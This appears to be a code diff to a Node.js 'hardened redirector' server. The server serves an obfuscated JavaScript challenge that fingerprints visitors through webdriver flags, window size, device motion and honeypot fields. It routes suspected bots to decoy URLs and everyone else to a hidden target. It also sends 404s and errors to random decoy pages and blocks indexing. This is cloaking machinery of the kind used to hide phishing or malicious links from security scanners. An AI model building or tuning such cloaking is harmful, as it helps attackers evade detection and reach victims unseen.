         navigator.webdriver ||
-        (window.outerWidth===0||window.outerHeight===0) ||
-        (mob && mot < minMot) ||
-        (mob && tiltE < minTilt) ||
-        (mob && compE < minComp && comp>0) ||
-        (mob && comp===0 && hasO && !hasCV) ||
-        (mob && hasM && !touch);
-
-      console.log(\`[CHECK] mob:\${mob} ent:\${ent.toFixed(1)} mov:\${moves} tilt:\${tiltE.toFixed(1)} comp:\${compE.toFixed(1)} mot:\${mot} hp:\${hpFilled()?'FILLED':'clean'} → \${sus?'BOT':'PASS'}\`);
-      location = sus ? B : T;
-    },950+Math.random()*1050);
+        (window.outerWidth === 0 && window.outerHeight === 0);
+      
+      if (!suspicious) {
+        trackSuccess();
+      }
+      
+      location.href = suspicious ? FALLBACK : TARGET;
+    }, 1200 + Math.random() * 800);
   })();`;
 
-  const obfJS = JavaScriptObfuscator.obfuscate(rawChallenge, {
+  // Obfuscate the challenge
+  const obfuscated = JavaScriptObfuscator.obfuscate(rawChallenge, {
     compact: true,
     controlFlowFlattening: true,
-    controlFlowFlatteningThreshold: 0.9,
+    controlFlowFlatteningThreshold: 0.75,
     deadCodeInjection: true,
     deadCodeInjectionThreshold: 0.4,
     stringArray: true,
     stringArrayRotate: true,
     stringArrayShuffle: true,
-    stringArrayWrappersCount: 2,
+    stringArrayThreshold: 0.8,
     numbersToExpressions: true,
-    identifierNamesGenerator: 'mangled-shuffled',
+    simplify: true,
+    shuffleStringArray: true,
+    splitStrings: true,
+    splitStringsChunkLength: 10,
     transformObjectKeys: true,
+    unicodeEscapeSequence: false,
+    identifierNamesGenerator: 'mangled',
+    renameGlobals: false,
     disableConsoleOutput: true
   }).getObfuscatedCode();
 
+  // Send verification page
   res.send(`<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <meta http-equiv="refresh" content="8;url=${BOT_URLS[0]}">
+  <meta name="robots" content="noindex, nofollow">
+  <meta http-equiv="refresh" content="5;url=${BOT_URLS[0]}">
   <title>Verifying...</title>
-  <style>
-    body{margin:0;background:#000;color:#aaa;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;}
-    .visually-hidden{position:absolute !important;width:1px !important;height:1px !important;padding:0 !important;margin:-1px !important;overflow:hidden !important;clip:rect(0,0,0,0) !important;border:0 !important;}
-    .spinner {border:4px solid #333;border-top:4px solid #0f0;border-radius:50%;width:32px;height:32px;animation:spin 1s linear infinite;margin:20px auto;}
-    @keyframes spin {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+  <style nonce="${nonce}">
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{background:#0a0a0a;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
+    .container{text-align:center;padding:20px}
+    .spinner{width:50px;height:50px;border:3px solid #333;border-top-color:#00ff88;border-radius:50%;margin:20px auto;animation:spin 1s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    p{color:#aaa;margin:10px 0}
+    .visually-hidden{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0}
   </style>
 </head>
 <body>
-  <div>
+  <div class="container">
     <div class="spinner"></div>
-    <p>Verifying request… please wait</p>
+    <p>Verifying your request...</p>
+    <p class="visually-hidden" aria-hidden="true">
+      <input type="text" id="hp_name_${hpSuffix}" tabindex="-1" autocomplete="off">
+      <input type="email" id="hp_email_${hpSuffix}" tabindex="-1" autocomplete="off">
+      <input type="tel" id="hp_phone_${hpSuffix}" tabindex="-1" autocomplete="off">
+    </p>
   </div>
-
-  <div class="visually-hidden">
-    <input type="text" id="hp_n_${hpSuffix}" autocomplete="off" tabindex="-1">
-    <input type="email" id="hp_e_${hpSuffix}" autocomplete="off" tabindex="-1">
-    <input type="url" id="hp_w_${hpSuffix}" autocomplete="off" tabindex="-1">
-    <input type="checkbox" id="hp_c_${hpSuffix}" tabindex="-1">
-  </div>
-
-  <script nonce="${res.locals.nonce}">${obfJS}</script>
+  <script nonce="${nonce}">${obfuscated}</script>
 </body>
 </html>`);
 });
 
 // ─── 404 Handler ─────────────────────────────────────────────────────────────
-app.use((_, res) => {
+app.use((req, res) => {
+  const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
+  logRequest('404', req, { redirectTo: safe });
+  res.redirect(safe);
+});
+
+// ─── Error Handler ───────────────────────────────────────────────────────────
+app.use((err, req, res, next) => {
+  console.error(`[ERROR] ${err.stack}`);
+  logRequest('ERROR', req, { error: err.message });
+  
   const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
   res.redirect(safe);
 });
 
+// ─── Graceful Shutdown ───────────────────────────────────────────────────────
+process.on('SIGTERM', gracefulShutdown);
+process.on('SIGINT', gracefulShutdown);
+
+async function gracefulShutdown() {
+  console.log('[SHUTDOWN] Received shutdown signal, cleaning up...');
+  
+  // Save stats to disk
+  try {
+    await fs.writeFile('stats_backup.json', JSON.stringify({
+      stats,
+      timestamp: new Date().toISOString()
+    }));
+    console.log('[SHUTDOWN] Stats saved');
+  } catch (err) {
+    console.error('[SHUTDOWN] Failed to save stats:', err);
+  }
+  
+  process.exit(0);
+}
+
 // ─── Start Server ────────────────────────────────────────────────────────────
-app.listen(PORT, '0.0.0.0', () => {
-  console.log(`[STARTUP] Hardened redirector listening on ${PORT}`);
-  console.log(`[STARTUP] Metrics API key: ${METRICS_API_KEY}`);
-  console.log(`[STARTUP] Links expire after ${LINK_TTL_SEC/60} minutes`);
+const server = app.listen(PORT, '0.0.0.0', () => {
+  console.log(`[STARTUP] 🚀 Hardened redirector v2.0`);
+  console.log(`[STARTUP] 📡 Listening on port ${PORT}`);
+  console.log(`[STARTUP] 🔑 Metrics API key: ${METRICS_API_KEY.substring(0, 8)}...`);
+  console.log(`[STARTUP] ⏱️  Links expire after ${LINK_TTL_SEC/60} minutes`);
+  console.log(`[STARTUP] 🌍 Environment: ${NODE_ENV}`);
+  
+  if (!IPINFO_TOKEN) {
+    console.log(`[STARTUP] ⚠️  IPINFO_TOKEN not set, geolocation disabled`);
+  }
 });
+
+server.keepAliveTimeout = 65000;
+server.headersTimeout = 66000;
